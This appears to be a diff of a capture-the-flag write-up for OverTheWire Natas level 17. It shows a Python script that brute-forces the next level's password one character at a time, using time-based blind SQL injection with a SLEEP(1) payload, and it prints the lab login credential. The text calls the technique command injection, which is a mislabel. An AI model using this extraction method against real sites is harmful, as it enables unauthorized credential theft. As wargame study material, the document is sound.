@@ -480,37 +480,57 @@ This level demonstrates **blind command injection** via timing attacks. The serv
 
 3. The attack script sends:
     ```
-    natas18" AND BINARY password LIKE "<prefix>" AND SLEEP(1) #
+    natas18" AND BINARY password LIKE "{test_password}%" AND SLEEP(1) #
     ```
     - If the password prefix is correct, the server sleeps for 1 second.
     - Otherwise, it responds immediately.
 
 4. The script logic:
-    
-    import requests
-    from string import *
-    from time import time
 
-    characters = lowercase + uppercase + digits
+```
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
-    username = 'natas17'
-    password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
-    url = 'http://%s.natas.labs.overthewire.org/' % username
+import requests
+import time
+import string
 
-    session = requests.Session()
-    seen_password = list()
+# Character set: lowercase + uppercase + digits
+characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
 
-    while len(seen_password) < 32:
-        for character in characters:
-            start_time = time()
-            response = session.post(
-                url,
-                data={"username": 'natas18" AND BINARY password LIKE "' + "".join(seen_password) + character + '%" AND SLEEP(1) # '},
-                auth=(username, password)
-            )
-            end_time = time()
-            if end_time - start_time > 1:
-                seen_password.append(character)
-                print("Current password: " + "".join(seen_password))
-                break
-    
+username = 'natas17'
+password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
+
+url = f'http://{username}.natas.labs.overthewire.org/'
+
+session = requests.Session()
+
+seen_password = []
+
+while len(seen_password) < 32:
+    for character in characters:
+        test_password = ''.join(seen_password) + character
+        print(f"Trying: {test_password}")
+
+        # Start the timer
+        start_time = time.time()
+
+        payload = f'natas18" AND BINARY password LIKE "{test_password}%" AND SLEEP(1) #'
+        response = session.post(
+            url,
+            data={"username": payload},
+            auth=(username, password)
+        )
+
+        # Measure time difference
+        end_time = time.time()
+        difference = end_time - start_time
+
+        if difference > 1:
+            # Found correct character
+            seen_password.append(character)
+            break  # Move to next position
+
+print("Recovered password:", ''.join(seen_password))
+```
+This will gradually build the password.
